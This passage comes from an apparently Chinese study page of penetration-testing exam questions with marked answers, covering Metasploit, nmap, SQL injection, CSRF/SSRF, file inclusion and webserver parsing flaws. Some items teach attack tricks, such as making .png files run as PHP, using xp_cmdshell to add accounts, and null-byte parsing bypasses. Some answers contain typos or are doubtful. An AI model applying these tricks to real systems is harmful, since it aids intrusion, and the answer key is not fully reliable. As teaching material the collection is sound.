<code>两个参数开启</code></li><li>以下不是远程文件包含和本地文件包含的配置区别（ ）<br>A. <code>本地文件包含php.ini配置文件中开启allow_url_include</code><br>B. 远程文件包含与本地文件包含的区别（开启allow_url_include和allow_url—ftp on）<br>C. 远程文件(包括本地文件包含)包含比本地文件包含的危害大<br>D. 本地包含文件可以上传图片GETshell</li><li>在.htaccess文件中，将.png 文件当作PHP 文件解析的语句是 （）<br>A. AddHandler php5-script php<br>B. <code>AddType application/x-httpd-php .png</code><br>C. SetHandler application&#x2F;x-httpd-php<br>D. AddType application&#x2F;x-httpd-php .jpg</li><li>下列不属于常见图片文件头部十六进制编码的是 （ ）<br>A. FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48<br>B. 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52<br>C. 47 49 46 38 39 61 F1 00 2C 01 F7 00 00 64 32 33<br>D. <code>00 00 10 00 00 61 F1 00 2C 46 00 01 01 01 32 33</code></li><li>WebShell 不是（ ）<br>A. 一个后门<br>B. 一个解释器<br>C. 通过HTTP协议通信<br>D. <code>个攻击木马</code></li><li>telnet发送http请求的特点正确的是（ ）<br>A. 会进行url编码<br>B. 请求格式是telnet+目标ip<br>C.进行put操作后就可以生成带后缀的目标文件<br>D. <code>这个方法的前提是服务器开启了put方式</code></li><li>下列对业务安全描述错误的是（ ）<br>A. 近年来，随着信息化技术的迅速发展和全球一体化进程的不断加快，计算机和网络已经成为与所有人都息息相关的工具和媒介，个人的工作、生活和娱乐，企业的管理，乃至国家的发展和改革都无处其外。<br>B. 信息和互联网带来的不仅仅是便利和高效，大量隐私、敏感和高价值的信息数据和资产，成为恶意攻击者攻击和威胁的主要目标。<br>C.<code>业务逻辑漏洞主要是开发人员业务流程设计的缺陷，仅限于代码层。</code><br>D. 网络安全已经成为任何个人、企业、组织和国家所必须面临的重要问题。</li><li>下列那个不是业务测试的流程（ ）<br>A. <code>黑白盒测试</code><br>B. 业务调研<br>C. 业务建模<br>D. 业务风险点识别</li><li>下列哪个不是业务逻辑安全漏洞造成的是（ ）<br>A.<code>缓冲区溢出</code><br>B. 登录框爆破<br>C. 任意金额修改<br>D. 重置后台管理员用户密码</li><li>以下（）不能用于提权<br>A. 系统本地溢出漏洞<br>B. 数据库<br>C.<code>cain</code><br>D. 第三方软件</li><li>目前Metasploit 最强大和最具吸引力的核心功能是（）<br>A. 威胁建模<br>B. 情报搜集<br>C.<code>渗透攻击</code><br>D. 漏洞分析</li><li>下列哪个不是Meterpreter的技术优势（）<br>A. 纯内存工作模式<br>B. 平台通用性<br>C. <code>明文传输</code><br>D. 易于扩展</li><li>以下哪个不是msf的模块？ （）<br>A. 攻击载荷模块<br>B. 空指令模块<br>C. <code>译码模块</code><br>D. 后渗透攻击模块</li></ol><h3 id="选择题-19"><a href="#选择题-19" class="headerlink" title="选择题 19"></a>选择题 19</h3><ol><li><p>以下哪个不是msf的模块？ （）<br>A. 攻击载荷模块<br>B. 空指令模块<br>C. <code>译码模块</code><br>D. 后渗透攻击模块</p></li><li><p>以下哪个不是msf的基本常用命令？ （）<br>A. show exploits<br>B. search<br>C. use<br>D. <code>show info</code></p></li><li><p>以下不属于CSRF的防御的是（）<br>A.<code>验证PostalCode 字段</code><br>B.添加Token 验证<br>C.二次验证<br>D.用户养成良好的习惯</p></li><li><p>预防CSRF(跨站点请求伪造),下面描述不正确的是（）<br>A. 验证 HTTP Referer 字段<br>B. 在HTTP请求中添加 token 并验证<br>C. 在 HTTP 头中自定义属性并验证<br>D. <code>对HTTP request和response做HTML encode</code></p></li><li><p>不具有可写权限的目录（）<br>A. 缓存文件夹<br>B. 日志文件夹<br>C. <code>SAM</code><br>D. 回收站</p></li><li><p>跨站请求伪造时有三个角色，以下没在其中的是（）<br>A. 服务器<br>B. <code>防御者</code><br>C. 攻击者<br>D. 终端用户</p></li><li><p>下面哪一个不是metinfo5.0.4的经典漏洞（）<br>A. sql注入<br>B. 文件上传<br>C. <code>远程控制</code><br>D. 文件包含</p></li><li><p>在同一个bash 下依次执行如下代码，最后一次执行的whoami 的结果是什么？（）<br>root@kali：<del>&#x2F;Desktop# whoami<br>root<br>root@kali：</del>&#x2F;Desktop# function whoami() { echo 1;}<br>root@kali：~&#x2F;Desktop# whoami<br>A. root<br>B. <code>1</code><br>C. echo 1<br>D. echo 1;</p></li><li><p>下列哪个表达式在Python中是非法的? （）<br>A. x &#x3D; y &#x3D; z &#x3D; 1<br>B.<code>x = (y = z + 1)</code><br>C. x, y &#x3D; y, x<br>D. x +&#x3D; y</p></li><li><p>下面哪个不是对SSRF的防御（）<br>A. 限制ip<br>B. 限制端口<br>C. 过滤返回信息<br>D.<code>过滤post参数</code></p></li><li><p>下面哪个不是渗透攻击的阶段之一（）<br>A. 漏洞分析阶段<br>B. 报告生成阶段<br>C. 威胁建模阶段<br>D.<code>漏洞复现阶段</code></p></li><li><p>下列关于隧道技术说法不正确的是（）<br>A. 是一种通过使用互联网络的基础设施在网络之间传递数据的方式<br>B. <code>使用隧道传递的数据（或负载）不可以是不同协议的数据帧或包</code><br>C. 隧道协议将其它协议的数据帧或包重新封装然后通过隧道发送<br>D. 使用隧道传递的数据（或负载）可以是不同协议的数据帧或包</p></li><li><p>下列说法正确的是 （）<br>A. 水平权限提升就是提权<br>B. <code>我们可以通过反弹Shell 的方法获得持久性连接，方便与对方进行通信。</code><br>C. 隧道技术和VPN是两码事<br>D. linux 提权是基于系统外核提权</p></li><li><p>下列哪个不是SSRF的危害（）<br>A.端口扫描<br>B. 内网Web 应用指纹识别<br>C. <code>攻击互联网Web 应用</code><br>D. 读取本地文件</p></li><li><p>被称为有钱人的漏洞是（）<br>A. <code>SSRF</code><br>B. XSS<br>C. SQL<br>D. 文件上传</p></li><li><p>下面那个不是基于系统内核提权 （）<br>A. cat &#x2F;etc&#x2F;issue<br>B. cat &#x2F;etc&#x2F;*-release<br>C. <code>cat /etc/sb-release</code><br>D. cat &#x2F;etc&#x2F;redhat-release</p></li><li><p>被动渗透攻击利用的漏洞那个不是正确的 （）<br>A. 浏览器<br>B. 浏览器插件<br>C. 电子邮件客户端<br>D. <code>网站</code></p></li><li><p>第三方软件提权不包括下列（）<br>A. 数据库提权<br>B. MYSQL提权<br>C. <code>linux提权</code><br>D. 搜狗输入法提权</p></li><li><p>Metasploit Framework 中，可以使用（）来<a href="https://so.csdn.net/so/search?q=%E6%9E%9A%E4%B8%BE&spm=1001.2101.3001.7020">枚举</a>本地局域网中的所有活跃主机。<br>A.dir_scanner<br>B.empty_udp<br>C.<code>arp_sweep</code><br>D.arp_neighbo</p></li><li><p>下面关于Metasploit说法错误的是（）<br>A. Metasploit 是一个开源的渗透测试开源软件<br>B. Metasploit 项目最初是由HD Moore 在2003 年夏季创立<br>C. 可以进行敏感信息搜集、内网拓展等一系列的攻击测试<br>D. <code>Metasploit最初版本是基于c语言</code></p></li></ol><h3 id="选择题-20"><a href="#选择题-20" class="headerlink" title="选择题 20"></a>选择题 20</h3><ol><li><p>网络安全法那一年发布，那一年施行（）。<br>A. <code>2016年11月7日发布，2017年6月1日起施行</code><br>B. 2015年12月7日发布，2017年6月1日起施行<br>C. 2014年11月7日发布，2017年6月1日起施行<br>D. 2016年12月7日发布，2017年6月1日起施行</p></li><li><p>以下关于MYSQL常用函数与参数的描述错误的是（）<br>A. left() 从左侧开始取指定字符个数的字符串<br>B. @@datadir 数据库路径<br>C.<code>current_user() 当前用户名和数据库名</code><br>D. ord() 返回ASCII 码</p></li><li><p>以下哪个MSF模块功能叙述错误（）<br>A. auxiliary&#x2F;scanner&#x2F;http&#x2F;dir_scanner 网站敏感目录扫描<br>B. auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep 枚举本地局域网中的所有活跃主机<br>C. <code>auxiliary/scanner/portscan/syn 服务扫描器</code><br>D. auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_sweep 发送UDP 数据包探查指定主机是否活跃，并发现主机上的UDP 服务</p></li><li><p>永恒之蓝漏洞利用以下哪个端口（）<br>A. 3389<br>B. 21<br>C. <code>445</code><br>D. 3306</p></li><li><p>如果一个网站存在CSRF漏洞，可以通过CSRF漏洞做下面哪些事情（）<br>A. 获取网站用户注册的个人资料信息<br>B. 修改网站用户注册的个人资料信息<br>C. 冒用网站用户的身份发布信息<br>D<code>以上都可以</code></p></li><li><p>下列关于网络防御说法错误的（）<br>A. 关于SSRF的防御措施有：限制协议、限制IP、限制端口、过滤返回信息、统一错误信息<br>B. csrf 的防御：验证Referer 、字段添加Token 验证、二次验证用户、养成良好的习惯<br>C. XSS 对输入(和URL参数)进行过滤，对输出进行编码<br>D. <code>sql防御方法不适用GET和POST 方式</code></p></li><li><p>以下（）不属于SSRF攻击的危害<br>A. <code>服务器瘫痪</code><br>B. 端口扫描<br>C. 内网Web应用指纹识别<br>D. 读取本地文件</p></li><li><p>当成功通过msf黑进对方系统并获得system权限后，不能做什么操作（）<br>A. 屏幕截图<br>B. 键盘记录<br>C. 读写文件<br>D. <code>开关机</code></p></li><li><p>面向身份信息的认证应用中，最常用的认证方法是（）<br>A. 基于数据库的认证<br>B. 基于摘要算法认证<br>C. 基于PKI认证<br>D. <code>基于账户名/口令认证</code></p></li><li><p>下列那个属于微软的漏洞公告编号（）<br>A. MB17-010<br>B. KB17-010<br>C.<code>MS17-010</code><br>D. GB17-010</p></li><li><p>Metasploit 简介那个是错误的（）<br>A. Metasploit 是一个开源的渗透测试开源软件<br>B. <code>HD Moore在2003 年的10月发布了他的第一个基于Ruby 语言的Metasploit 版本</code><br>C. v4.0 版本在渗透攻击、攻击载荷与辅助模块的数量上都有显著的扩展，此外还引入一种新的模块类型——后渗透攻击模块<br>D. Metasploit v3.0 的发布,真正成为一个事实上的渗透测试技术研究与开发平台</p></li><li><p>作为安全人员我们应该（）<br>A.<code>遵纪守法坚守道德底线</code><br>B. 打法律的插边球<br>C. 提高自己技术水平让别人抓不到证据<br>D. 入侵网站后不干扰其正常业务即可</p></li><li><p>跨站脚本攻击是（）<br>A. ssrf<br>B. csrf<br>C. ddos<br>D. <code>xss</code></p></li><li><p>以下关于Metasploit基本命令的描述，不正确的是（）<br>A. msfconsole 命令行下启动MSF<br>B. show exploits 显示所有的渗透攻击模块<br>C. <code>use 搜索某个模块</code><br>D. show options 显示模块的参数</p></li><li><p>nmap哪个参数是探测端口服务版本（）</p></li></ol><p>A. sS<br>B. <code>sV</code><br>C. sF<br>D. sP</p><ol start="17"><li><p>在网络安全中，截取是指未授权的实体得到了资源的访问权，这是对（）<br>A. 可用性的攻击<br>B. 完整性的攻击<br>C. <code>保密性的攻击</code><br>D. 真实性的攻击</p></li><li><p>以下哪些<strong>不属于</strong>漏洞利用缓解的范围（）</p></li></ol><p>A.  PIE</p><p>B.  StackCanary</p><p>C.  NX&#x2F;DEP</p><p>D.  <code>ROP</code></p><ol start="19"><li>URL访问控制不当<strong>不包括</strong>（）</li></ol><p>A.  Web应用对页面权限控制不严</p><p>B.  缺乏统一规范的权限控制框架</p><p>C.  部分页面可以直接从URL中访问</p><p>D.  <code>使用分散登录认证</code></p><ol start="20"><li>以下关于RSA和ECC说法<strong>不正确</strong>的是（）【凭记忆，大概差不了多少】</li></ol><p>A.  RSA是基于大数分解问题</p><p>B.  ECC是基于椭圆曲线上离散对数计算问题</p><p>C.  当RSA算法中密钥长度较短时，安全强度降低</p><p>D.  <code>在相同的安全强度下，ECC算法的密钥长度比RSA算法的密钥长度长</code></p><h3 id="选择题-21"><a href="#选择题-21" class="headerlink" title="选择题 21"></a>选择题 21</h3><p>1 哪些措施可以保护个人信息（）<strong>A</strong><br>A. 定期修改密码或采用强密码<br>B. 从不清理系统日志或各种软件使用痕迹<br>C. 随意连接wifi<br>D. 使用记住密码</p><p>2 Burp Suite 是用于攻击（）的集成平台。<strong>A</strong><br>A. web 应用程序<br>B. 客户机<br>C. 服务器<br>D. 浏览器</p><p>3 使用nmap进行ping扫描时使用的参数（）<strong>A</strong><br>A. -sP<br>B. -p<br>C. -p0<br>D. -A</p><p>4 nmap的-sV是什么操作（）<strong>C</strong><br>A. TCP全连接扫描<br>B. FIN扫描<br>C. 版本扫描<br>D. 全面扫描</p><p>5 在HTTP 状态码中表示重定向的是（）<strong>B</strong><br>A. 200<br>B. 302<br>C. 403<br>D. 500</p><p>6 以下哪个是常用WEB漏洞扫描工具（）<strong>A</strong><br>A. Acunetix WVS 8.0<br>B. hydra<br>C. 中国菜刀<br>D. NMAP</p><p>7 扫描器之王NMAP中，全面扫描的命令是什么（）<strong>D</strong><br>A. -O<br>B. -sV<br>C. -sP<br>D. -A</p><p>8 Hydra 工具中的 -L 参数的含义是（）<strong>D</strong><br>A. 指定单个密码<br>B. 指定一个密码字典<br>C. 指定一个用户名<br>D. 指定一个用户名字典</p><p>9 在远程管理Linux服务器时，以下（ ）方式采用加密的数据传输。<strong>C</strong><br>A. rsh<br>B. telnet<br>C. ssh<br>D. rlogin</p><p>10下列工具中可以对Web表单进行暴力破解的是？（ ）<strong>A</strong><br>A. Burp suite<br>B. Nmap<br>C. Sqlmap<br>D. Appscan</p><p>11 下列选项中不是Hydra 工具中的 -e 参数的值是（）<strong>A</strong><br>A. o<br>B. n<br>C. s<br>D. r</p><p>12 aspx 的网站配置文件一般存放在哪个文件里（）<strong>C</strong><br>A. conn.asp<br>B. config.php<br>C. web.config<br>D. index.aspx</p><p>13在Google Hacking 中，下面哪一个是搜索指定文件类型的语句（）<strong>D</strong><br>A. intext<br>B. intitle<br>C. site<br>D. filetype</p><p>14 在网上填写个人信息时，应注意（）<strong>B</strong><br>A. 全部填写真实信息<br>B. 选择性填写真实信息<br>C. 全部填写虚假信息<br>D. 不填</p><p>15 SQL 注入出password 的字段值为“YWRtaW44ODg&#x3D;”，这是采用了哪种加密方式（）<strong>B</strong><br>A. md5<br>B. base64<br>C. AES<br>D. DES</p><p>16当发觉自己个人信息泄漏时，正确的处理方式（）<strong>D</strong><br>A. 无所谓，不予理会<br>B. 心有芥蒂，但无行动<br>C. 在网络上进行抱怨<br>D. 向有关部门或企业进行投诉</p><p>17.如果个人信息泄漏不会导致一下那些麻烦（）<strong>D</strong><br>A．骚扰短信或骚扰电话<br>B．被冒充熟人进行诈骗<br>C．身份被冒用，以至个人名誉及财产受损<br>D．没有影响</p><p>18 关于木马植入的方法，不正确的是（）<strong>B</strong><br>A．邮件植入<br>B．系统生成<br>C.  文件下载<br>D.  im植入</p><p>19 以下关于windows SAM（安全账户管理器）的说法错误的是（）<strong>C</strong><br>A、安全账户管理器（SAM）具体表现就是%SystemRoot%\system32\config\sam<br>B、安全账户管理器（SAM）存储的账号信息是存储windows服务都需要用户进行登录后，以登录用户的权限进行启动在注册表中<br>C、安全账户管理器（SAM）存储的账号信息对administrator和system是可读和可写的<br>D、安全账户管理器（SAM）是windows的用户数据库，系统进程通过Security Accounts Manager服务进行访问和操作</p><p>20 下列木马入侵步骤中顺序正确的是（）<strong>C</strong><br>A. 信息泄漏-建立连接-运行木马<br>B. 传播木马-远程控制-信息泄漏<br>C. 配置木马-传播木马-运行木马<br>D. 信息泄漏-建立连接-传播木马</p><hr><p>A<br>B<br>C<br>D</p><h3 id="选择题-22"><a href="#选择题-22" class="headerlink" title="选择题 22"></a>选择题 22</h3><p>1 默认情况下windows 哪个版本可以 抓到 lm hash</p><p><strong>A XP</strong><br>B win10<br>C win 7<br>D win server 08</p><p>2 如何防护存储型XSS漏洞</p><p><strong>A 对html进行转义处理</strong><br>B 使用AJAX请求<br>C 使用安全浏览器<br>D 使用cookie存储信息</p><p>3 Linux 查询日志最后100行数据 正确的是</p><p>A MV -100 log<br>B grep -100 log<br>C cat -100 log<br><strong>D tail -100 log</strong></p><p>4 以下命令可以用来获取DNS记录的是</p><p>A trace route<br>B ping<br><strong>C dig</strong><br>D who</p><p>5 apache 默认解析的后缀不包括</p><p>A php3<br>B php5<br>C phtml<br><strong>D pht</strong></p><p>6 在测试SQL注入以下那种方式不可取</p><p><strong>A ?id&#x3D;1+1</strong><br>B ?id&#x3D;2-1<br>C ?id&#x3D;1 and 1&#x3D;1<br>D ?id&#x3D;1 or 1&#x3D;1</p><p>7 在编写目录工具是使用那种请求方式可以增加扫描工具</p><p>A GET<br><strong>B HEAD</strong><br>C POST<br>D PUT</p><p>8 不属于文件包含的函数为</p><p>A include<br>B require<br><strong>C include_onse</strong><br>D include_once</p><p>9 以下关于information_schema说法不正确的是</p><p>A 存在table_name表<br>B 存在column表<br>C 存在column_table字段<br><strong>D 存在column_schemata字段</strong></p><p>10 msf中设定特定的配置参数的命令是</p><p><strong>A set function</strong><br>B show auxiliary<br>C search name<br>D show options</p><p>11 nmap -sS 命令是</p><p>A 扫描开放端口<br><strong>B 半开放端口</strong><br>C 全开放端口<br>D 扫描UDP</p><p>12 awvs中的HTTP sniffer是指</p><p>A HTTP信息查看编辑<br><strong>B HTTP监听嗅探</strong><br>C HTTP模糊测试<br>D HTTP认证测试</p><p>13 PHP解析器可以根据$fun的值调取对应的函数，下列说法错误的是</p><p><strong>A PHP动态函数调用最多只能执行phpinfo,并没有太多的影响</strong><br>B 当$fun的值为A，那么$fun对应的函数就是A（）<br>C 当$fun的值为phpinfo，$fun对应的函数就是phpinfo（）<br>D 这样给分开发人员带来便利，但是存在安全隐患</p><p>14 列出MSF框架中所有攻击载荷的命令是</p><p>A show exploits<br><strong>B show payloads</strong><br>C show auxiliary<br>D search name</p><p>15 php cgi 解析漏洞出现的原因是</p><p><strong>A.cgi.fix_pathinfo配置错误</strong> </p><p>B.phpinfo配置错误 </p><p>C.cgi.fix_pathi配置错误 </p><p>D.cgi.fix__status_en配置错误 </p><p>16 nmap 进行ping扫描的参数</p><p>A p<br>B p0<br>C A<br><strong>D -sp</strong></p><p>17 nmap可以识别几种端口状态</p><p>A 2<br>B 3<br>C 5<br><strong>D 6</strong></p><p>18 当成功通过msf黑进对方系统并获得system权限后，不能做什么操作</p><p><strong>A 开关机</strong></p><p>B 屏幕截图</p><p>C 读写文件</p><p>D 键盘记录</p><p>19 Unix系统中存放每个用户信息的文件是</p><p>A.&#x2F;sys&#x2F;password </p><p>B.&#x2F;sys&#x2F;passwd </p><p>C.&#x2F;etc&#x2F;password </p><p><strong>D.&#x2F;etc&#x2F;passwd</strong> </p><p>20 预防CSRF(跨站点请求伪造),下面描述不正确的是（）<br>A. 验证 HTTP Referer 字段<br>B. 在HTTP请求中添加 token 并验证<br>C. 在 HTTP 头中自定义属性并验证<br><strong>D. 对HTTP request和response做HTML encode</strong></p><hr><h3 id="选择题-23"><a href="#选择题-23" class="headerlink" title="选择题 23"></a>选择题 23</h3><p>1.Unix系统中存放每个用户信息的文件是</p><p>A.&#x2F;sys&#x2F;password </p><p>B.&#x2F;sys&#x2F;passwd </p><p>C.&#x2F;etc&#x2F;password </p><p><strong>D.&#x2F;etc&#x2F;passwd</strong> </p><p>2.Metasploit Framework 中，可以使用（）来<a href="https://so.csdn.net/so/search?q=%E6%9E%9A%E4%B8%BE&spm=1001.2101.3001.7020">枚举</a>本地局域网中的所有活跃主机。<br>A.dir_scanner<br>B.empty_udp<br><strong>C.arp_sweep</strong><br>D.arp_neighbo</p><p>3·TCP会话劫持出了SYN　Flood攻击，还需要</p><p>A.  SYN扫描<br><strong>B.  序列号预测</strong><br>C.  扫描TCP<br>D.  扫描SYN&#x2F;ACK</p><p>4·SQL Sever中可以使用哪个存储过程调用操作系统命令，添加系统账号</p><p>A.xp_dirtree<br>B.xp_xshell<br><strong>C.xp_cmdshell</strong><br>D.xp_deletekey</p><p>5.SQL注入中 &#x3D; 被过滤可以使用  来代替</p><p>A.&amp; </p><p>B.VS </p><p>C.AND </p><p><strong>D.LIKE</strong> </p><p>6·PHP 提供以下哪个函数来避免SQL注入</p><p>A.htmlentities<br>B.escapeshellarg<br><strong>C.mysql_real_escape_string</strong><br>D.escapeshellcmd</p><p>7.下列哪项不属于同源策略的要求</p><p>A 同域名</p><p><strong>B 同IP</strong></p><p>C 同端口</p><p>D 同协议</p><p>8.以下哪种方法不能找到CDN的网站的真实IP</p><p>A.利用SSL证书寻找真实IP </p><p><strong>B.使用Wireshark对本地网络请求进行抓包分析</strong> </p><p>C.使用世界各地服务器对域名进行PING检测 </p><p>D.查询历史DNS记录</p><p>9.CSRF攻击不能做什么</p><p><strong>A 盗取用户凭证</strong></p><p>B 修改用户权限</p><p>C 删除用户信息</p><p>D 取消订单</p><p>10.对网络系统进行渗透测试，通常是按什么顺序来进行的</p><p>A 侦查阶段、控制阶段、入侵阶段</p><p><strong>B 侦查阶段、入侵阶段、控制阶段</strong></p><p>C 控制阶段、侦查阶段、入侵阶段</p><p>D 入侵阶段、侦查阶段、控制阶段</p><p>11.XXE漏洞可以做什么</p><p>A.获取用户浏览器信息<br>B.网络钓鱼<br><strong>C.读取服务器文件</strong><br>D.盗取用户cookie</p><p>12.通过修改HTTP Headers 中的哪个键值可以伪造来源网址</p><p>A User-Agent</p><p>B Accept</p><p><strong>C Referer</strong></p><p>D X-Forwarded-For</p><p>13.Apache的配置文件中，哪个字段定义了访问日志的路径</p><p>A.HttpdLog<br>B.HttpLog<br>C.AccessLog<br><strong>D.CustomLog</strong></p><p>14.HTTP 302状态消息表示 </p><p>A.对被请求页面的访问被禁止<br>B.所请求的页面可在别的url下被找到<br><strong>C.所请求的页面已经临时转移至新的url</strong><br>D.所请求的页面已经转移至新的url  （301）</p><p>15.以下数据库只能通过字典枚举数据表的是</p><p>A.mssql<br>B.oracle<br>**C.mysql &lt; 5.0**<br>D.mysql &gt; 5.0</p><p>16·在编写目录扫描的工具时，那个可以增加扫描速度</p><p>A.GET<br><strong>B.HEAD</strong><br>C.POST<br>D.PUT</p><p>17.SQLMAP脱裤的命令为</p><p><strong>A.dump</strong><br>B.sleep<br>C.down<br>D.up</p><p>18.Metasploit Framework 中指定使用的攻击载荷的命令是。<br>A.show payloads<br>B.show auxiliary<br>C.search name<br><strong>D.set payload name</strong></p><p>19.常规端口扫描和半开放式扫描的区别是</p><p>A.没区别<br><strong>B.没有完成三次握手，缺少ACK</strong><br>C.半开放采用UDP的方式扫描<br>D.扫描的准确性不一样</p><p>20.Redis数据库的默认端口是哪个</p><p>A.3306<br>B.1433<br>C.1521<br><strong>D.6379</strong></p><hr><h3 id="选择题-24"><a href="#选择题-24" class="headerlink" title="选择题 24"></a>选择题 24</h3><p>1.HTTP 302状态消息表示()<br>A.对被请求页面的访问被禁止</p><p>B.所请求的页面可在别的url下被找到</p><p><strong>C.所请求的页面已经临时转移至新的url</strong> </p><p>D.所请求的页面已经转移至新的url</p><p>2.XXE漏洞可以做什么()<br>A.盗取用户cookie </p><p>B.网络钓鱼</p><p>C.获取用户浏览器信息</p><p><strong>D.读取服务器文件</strong></p><p>3.Mysql数据库若使用load_file函数读取操作系统文件时需要的权限是<br><strong>A.File</strong> </p><p>B.Read</p><p>C.Write</p><p>D.Load File</p><p>4.SQLSERVER数据库身份验证支持的模式错误是<br>A.SQL身份验证模式</p><p>B.windows身份验证模式</p><p>C.windows和SQL混合验证模式</p><p><strong>D.radius身份验证模式</strong></p><p>5.以下哪些是WebLogic安装后的默认帐户名、口令使用的字符串<br>A.admin</p><p>B.login</p><p><strong>C.weblogic</strong> </p><p>D.system</p><p>6.以下查看linux系统内核版本是<br>A.uname-a</p><p>B.cat&#x2F;etc&#x2F;passwd </p><p>C.cat&#x2F;release-a</p><p><strong>D.cat&#x2F;porc&#x2F;version</strong></p><p>7.在编写目录扫描工具时哪种请求方式可以增加扫描速度()<br><strong>A.HEAD</strong></p><p>B.GET</p><p>C.PUT</p><p>D.POST</p><p>8.如下哪个响应报头可以让我们跳转到新的位置()</p><p>A.Server</p><p>B.WWW-Authenticate</p><p>C.Host </p><p><strong>D.Location</strong></p><p>9.没权限访问某个页面，服务器会返回哪个状态码()</p><p>A.500</p><p>B.200</p><p><strong>C.403</strong></p><p>D.401</p><p>10.htaccess文件的作用描述错误的是()<br>A.可以禁止目录列表</p><p>B.配置默认文档</p><p><strong>C.修改密码</strong></p><p>D.自定义404错误页面</p><p>11.防御文件包含漏洞的方法不包括什么</p><p>A.文件名中禁止出现目录名</p><p><strong>B.禁止文件上传</strong></p><p>C.禁止文件名中包含字母和数字之外的字符</p><p>D.禁止自定义文件名</p><p>12.默认情况下， windows的哪个版本可以抓取到LM hash()</p><p>A.windows 7</p><p>B.windows server 2008</p><p><strong>C.windowsXP</strong> </p><p>D.windows Vista</p><p>13.一个网站存在命令执行漏洞，由于服务器不能连外网，这时我们可以利用什么样的方式将文件上传到服务器()</p><p>A.vbs</p><p><strong>B.echo</strong></p><p>C.FTP</p><p>D.power shell</p><p>14.在linux下为某个文件添加权限， 命令chmod741 test中的4代表什么权限()</p><p>A.执行权限</p><p>B.只写权限</p><p><strong>C.只读权限</strong></p><p>D.所有权限</p><p>15.下面的哪个命令可以打印linux下的所有进程信息()<br><strong>A.ps-ef</strong></p><p>B.Is-I</p><p>C.Is-d</p><p>D.su</p><p>16.下面哪个是administrator用户的SID()</p><p>A.S-1-5-21-3698344474-843673033-3679835876-1000</p><p>B.S-1-5-21-3698344474-843673033-3679835876-100</p><p>C.S-1-5-21-3698344474-843673033-3679835876-1001</p><p><strong>D.S-1-5-21-3698344474-843673033-3679835876-500</strong></p><p>17.在windows系统中， 下列哪个命令不能用于查看操作系统的版本号<br>A.win ver</p><p>B.system info</p><p><strong>C.version</strong></p><p>D.cmd.exe</p><p>18.以下哪种方式可以利用ngn x解析漏洞来将文件当作php来执行()<br>A.&#x2F;xx.php%00.jpg</p><p><strong>B.&#x2F;xx.jpg%00.php</strong></p><p>C.&#x2F;xx.jpg.php</p><p>D.&#x2F;xx.php.jpg</p><p>19.apache默认解析的后缀中不包括<br><strong>A.pht</strong></p><p>B.php 3</p><p>C.php 5</p><p>D.phtml</p><p>20.之前版本的中间件未出现过解析漏洞的是<br>A.i is</p><p>B.apache</p><p>C.ng nix</p><p><strong>D.tomcat</strong></p><hr><h3 id="选择题-25"><a href="#选择题-25" class="headerlink" title="选择题 25"></a>选择题 25</h3><p>1.SQL Sever中可以使用哪个存储过程调用操作系统命令， 添加系统账号?()<br>A.xp_dirtree</p><p>B.xp_xshell</p><p><strong>C.xp_cmdshell</strong></p><p>D.xpdeletekey</p><p>2.Oracle默认情况下， 口令的传输方式是()<br>A.DES加密传输</p><p><strong>B.明文传输</strong></p><p>C.3DES加密传输</p><p>D.MD5加密传输</p><p>3.不属于数据库加密方式的是()<br><strong>A.硬件&#x2F;软件加密</strong></p><p>B.库内加密</p><p>C.专用中间件加密</p><p>D.库外加密</p><p>4.IPSec VPN安全技术没有用到()<br>A.端口映射技术</p><p>B.隧道技术</p><p>C加密技术</p><p><strong>D.入侵检测技术</strong></p><p>5.小斌正在对小明的网站进行渗透测试，经过一段时间的探测后，小斌发现小明的网站存在一个sql注入漏洞:<a href="http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014%E8%AF%A5%E5%9C%B0%E5%9D%80%E6%98%AF%E7%94%A8%E4%BA%8E%E6%90%9C%E7%B4%A2%E7%94%A8%E6%88%B7%E6%9B%BE%E7%BB%8F%E7%9A%84%E5%8F%91%E8%A8%80%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%BC%9A%E8%BF%94%E5%9B%9E%E4%B8%80%E4%BA%9B%E7%95%99%E8%A8%80%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%B0%8F%E6%96%8C%E7%AE%80%E5%8D%95%E6%B5%8B%E8%AF%95%E5%90%8E%E5%8F%91%E7%8E%B0http%EF%BC%9A//i.xiaoming.com/user">http://i.xiaoming.com/user/says.php?uid=1845%20skey=2014该地址是用于搜索用户曾经的发言的页面，会返回一些留言信息，小斌简单测试后发现http：//i.xiaoming.com/user</a><br>&#x2F;says.php?uid&#x3D;1845%20skey&#x3D;2014’%20or%202-1%20–%20返回错误信息http:&#x2F;&#x2F;.xiaoming.com&#x2F;user&#x2F;says.php?uid&#x3D;1845%20skey&#x3D;2014’%20) %200%201-1%20–%20却返回空白信息则小明网站该处逻辑可能的sql语句是：()</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">A.select * <span class="hljs-keyword">from</span> user_says where <span class="hljs-attribute">deleted</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">uid</span>=<span class="hljs-variable">$uid</span> <span class="hljs-keyword">and</span> skey like <span class="hljs-string">&quot;%<span class="hljs-variable">$skey</span>%&quot;</span><br>B.select * <span class="hljs-keyword">from</span> user_says where deleted = 0 <span class="hljs-keyword">and</span>(<span class="hljs-attribute">uid</span>=<span class="hljs-variable">$uid</span> <span class="hljs-keyword">and</span> skey like <span class="hljs-string">&#x27;%$skey%&#x27;</span>)<br>C.select * <span class="hljs-keyword">from</span> user_says where deleted = 0 <span class="hljs-keyword">and</span>(<span class="hljs-attribute">uid</span>=<span class="hljs-variable">$uid</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">skey</span>=<span class="hljs-string">&#x27;$key&#x27;</span>)<br>D.select * <span class="hljs-keyword">from</span> user_says where <span class="hljs-attribute">deleted</span>=0 <span class="hljs-keyword">and</span> <span class="hljs-attribute">uid</span>=<span class="hljs-variable">$uid</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">skey</span>=<span 